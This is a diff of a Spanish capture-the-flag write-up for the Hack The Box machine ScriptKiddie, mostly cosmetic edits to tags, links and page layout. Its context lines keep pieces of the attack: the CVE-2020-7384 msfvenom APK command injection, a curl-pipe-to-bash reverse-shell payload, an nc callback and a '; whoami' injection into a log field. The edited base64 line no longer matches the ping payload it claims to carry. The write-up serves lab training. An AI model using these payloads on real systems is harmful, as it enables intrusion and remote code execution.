@@ -15,13 +15,13 @@ tags:
   - Linux
   - Werkzeug
   - Msfvenom Exploitation - APK Template Command Injection
-  - CVE-2020-7384
-  - Abusing Logs 
+  - CVE-2020-7384 (Msfvenom Exploitation - APK TCI)
+  - Abusing Logs
   - Abusing CRON Jobs
-  - Command Injection
+  - Command Injection (CI)
   - Pivoting
-  - Abusing Sudoers Privilege
-  - Msfconsole Privilege Escalation
+  - Privesc - Abusing Sudoers Privileges
+  - Privesc - Msfconsole Privilege Escalation
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png)
@@ -29,6 +29,7 @@ tags:
 Esta fue una máquina un poco complicada, lo que hicimos fue analizar los campos/funciones de la página web, así encontramos que podemos utilizar el Exploit **CVE-2020-7384** para conectarnos de manera remota a la máquina víctima, después de enumerar lo que había dentro como el **usuario Kid**, analizamos 2 scripts y las **tareas CRON** activas (esto con **pspy**) que nos permitira hacer **pivoting** para conectarnos a otro usuario llamado **pwn**, esto mediante inyección de comandos. El **usuario pwn** tendrá permisos para usar la consola de **Metasploit**, dentro de la consola, usaremos la terminal de **Ruby** para convertirnos en **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *whatweb*
 * *wfuzz*
@@ -44,6 +45,7 @@ Herramientas utilizadas:
 * *bash*
 * *wget*
 * *echo*
+* *metasploit framework(msfconsole)*
 
 
 <br>
@@ -91,10 +93,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -184,14 +183,12 @@ Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
 
 Ya nos apareció otro puerto, no sé por qué no se mostró en el escaneo de puertos, pero bueno, al parecer es una página web, vamos a analizarla.
 
+
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -209,16 +206,19 @@ Mmmmm, a simple vista, no veo nada que más que los 3 campos. Usemos la herramie
 whatweb http://10.10.10.226:5000/                                                                                 
 http://10.10.10.226:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
 ```
+
 Veo que, aparte de que está hecho en **Python**, están usando el servicio **Werkzeug**, investiguemos de que se trata:
 
 | **Servicio Werkzeug** |
 |:-----------:|
 | *Werkzeug es una completa biblioteca de aplicaciones web WSGI. Comenzó como una simple colección de varias utilidades para aplicaciones WSGI y se ha convertido en una de las bibliotecas de utilidades WSGI más avanzadas. Un servidor WSGI (Web Server Gateway Interface) es necesario para las aplicaciones web Python ya que un servidor web no puede comunicarse directamente con Python. WSGI es una interfaz entre un servidor web y una aplicación web basada en Python.* |
 
+<br>
+
 Vaya, es una herramienta alemana, quizá en **HackTricks** tengan algo útil sobre esta librería.
 
 Aquí hay algo:
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" target="_blank">Werkzeug / Flask Debug</a>
 
 De acuerdo al post, si la librería tiene activo **debug**, podemos activar una consola interactiva. 
 
@@ -256,7 +256,7 @@ Vamos a crear un ejemplo:
 <img src="/assets/images/htb-writeup-scriptkiddie/Captura7.png">
 </p>
 
-Le indique una IP random y use una plantilla (esto se hace con el parámetro -x de **msfvenom** para usar un archivo ejecutable como plantilla para tu payload), esto nos genera un ejecutable que podemos descargar:
+Le indique una IP random y use una plantilla (esto se hace con el **parámetro -x** de **msfvenom** para usar un archivo ejecutable como plantilla para tu payload), esto nos genera un ejecutable que podemos descargar:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-scriptkiddie/Captura8.png">
@@ -346,10 +346,7 @@ Tampoco nos muestra nada, entonces, todo apunta a que debemos buscar la manera d
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -371,6 +368,7 @@ Metasploit Framework 6.0.11 - msfvenom APK template command injection           
 Shellcodes: No Results
 Papers: No Results
 ```
+
 Si te das cuenta, genera una APK, que es una de las opciones que podemos cargar a la página web al elegir la opción de **Android** y asignarle una plantilla.
 
 No estoy seguro de que sea esa versión la que está usando la máquina víctima, pero no perdemos nada con intentarlo.
@@ -405,10 +403,10 @@ payload = 'ping -c 4 Tu_IP'
 python Msfvenom_Exploit.py                           
 [+] Manufacturing evil apkfile
 Payload: ping -c 4 Tu_IP
--dname: CN='|echo cGluZyAtYyA0IDEwLjEwLjE0LjE2 | base64 -d | sh #
+-dname: CN='|echo Q2hlIGNoaXNtb3NvLCBxdWUgaGFjZXMgcmV2aXNhbmRvIGVzdG8gd2UK | base64 -d | sh #
   adding: empty (stored 0%)
 Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
-        para: CN="'|echo cGluZyAtYyA0IDEwLjEwLjE0LjE2 | base64 -d | sh #"
+        para: CN="'|echo Q2hlIGNoaXNtb3NvLCBxdWUgaGFjZXMgcmV2aXNhbmRvIGVzdG8gd2UK | base64 -d | sh #"
 jar signed.
 Warning: 
 The signer's certificate is self-signed.
@@ -463,6 +461,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 8 packets received by filter
 0 packets dropped by kernel
 ```
+
 ¡Excelente! Podemos usar este Exploit para ganar acceso.
 
 <h2 id="Acceso">Ganando Acceso a la Máquina Usando Exploit de Msfvenom</h2>
@@ -471,7 +470,7 @@ Hice varias pruebas para aplicar una **Reverse Shell** que me conectara a la má
 
 **Opción 1**:
 * Vamos a cambiar el script, aplicaremos **curl** para que pueda leer e interpretar un archivo que contiene una **Reverse Shell**:
-```
+```python
 payload = 'curl Tu_IP/revShell.sh | bash'
 ```
 
@@ -623,17 +622,14 @@ user.txt
 kid@scriptkiddie:~$ cat user.txt
 cat user.txt
 ```
-Ahora, veamos como obtener acceso como Root.
+Ahora, veamos como obtener acceso como **Root**.
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -717,6 +713,7 @@ app = Flask(__name__)
 Si es para la página web, analicemos un poco el script.
 
 Hay dos funciones que me parecen interesantes:
+
 * La primera es la función **scan**:
 ```python
 def scan(ip):
@@ -749,6 +746,7 @@ def searchsploit(text, srcip):
             f.write(f'[{datetime.datetime.now()}] {srcip}\n')
         return render_template('index.html', sserror="stop hacking me - well hack you back")
 ```
+
 Esta función utiliza la variable **regex_alphanum** para aplicar la busqueda de Exploit con **searchsploit**, esto lo hace en caso de que sea texto, caso contrario abrira el **archivo hackers** para agregar la fecha y el contenido de la **variable srcip** (que creo que es una IP) para al final mostrar un mensaje de que lo dejemos de hackear.
 
 Quiero pensar que hizo esto para evitar alguna inyección en los campos de la página web.
@@ -779,9 +777,7 @@ Puede que este ocurriendo un proceso en segundo plano, vamos a comprobarlo con l
 | *pspy es una herramienta de línea de comandos diseñada para espiar procesos sin necesidad de permisos de root. Le permite ver comandos ejecutados por otros usuarios, cron jobs, etc. mientras se ejecutan. Genial para enumerar sistemas Linux en CTFs. También es genial para demostrar a tus colegas por qué pasar secretos como argumentos en la línea de comandos es una mala idea. La herramienta recoge la información de los escaneos procfs. Los vigilantes Inotify colocados en partes seleccionadas del sistema de archivos activan estos escaneos para capturar procesos de corta duración.* |
 
 Aca te dejo el **GitHub**:
-* https://github.com/DominicBreuker/pspy
-
-<br>
+* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy - unprivileged Linux process snooping</a>
 
 Descarga cualquiera, aunque yo use la version 64.
 
@@ -841,7 +837,7 @@ done
 2023/05/08 02:19:47 CMD: UID=1000  PID=446398 | ./pspy64 
 2023/05/08 02:19:47 CMD: UID=1000  PID=446291 | bash -i 
 2023/05/08 02:19:47 CMD: UID=1000  PID=446242 | /bin/sh 
-2023/05/08 02:19:47 CMD: UID=1000  PID=446241 | nc 10.10.14.43 443
+2023/05/08 02:19:47 CMD: UID=1000  PID=446241 | nc Tu_IP 443
 ```
 
 Ahora, como ya vimos que en la función **Sploit** realiza un filtro a la hora de poner algo que no sea texto, veamos que pasa si ponemos simbolos random:
@@ -872,6 +868,7 @@ Observa el resultado:
 2023/05/08 02:20:28 CMD: UID=1001  PID=446432 | cat /home/kid/logs/hackers 
 2023/05/08 02:20:28 CMD: UID=1001  PID=446437 | /bin/bash /home/pwn/scanlosers.sh 
 ```
+
 Al parecer, ejecuta el script **scanlosers.sh** del **usuario pwn** (descubrimos otro usuario) y además nos esta aplicando un escaneo a nosotros, también parece que lee el **archivo hackers**, pero como nosotros no vimos que tuviera conteido, supongo que a de borrar lo que se le esta escribiendo.
 
 Vamos a ver al usuario **pwn**.
@@ -948,6 +945,7 @@ echo "[2023-05-08 23:10:46.713999] Tu_IP" | cut -d' ' -f3- | sort -u
 Vemos que se obtuvo solamente la IP, cortando la fecha. De esta forma funciona el filtro, para obtener solamente la IP que se guardo en el archivo **hackers**.
 
 Ahora checa esto:
+
 * Agrega el comando **whoami** después de la IP:
 ```bash
 echo "[2023-05-08 23:10:46.713999] Tu_IP; whoami" | cut -d' ' -f3- | sort -u
@@ -1126,11 +1124,9 @@ Al fin, terminamos la máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://werkzeug.palletsprojects.com/en/2.3.x/
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
@@ -1138,5 +1134,51 @@ Al fin, terminamos la máquina.
 * https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
 * https://github.com/rapid7/metasploit-framework/issues/14130
 
+
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
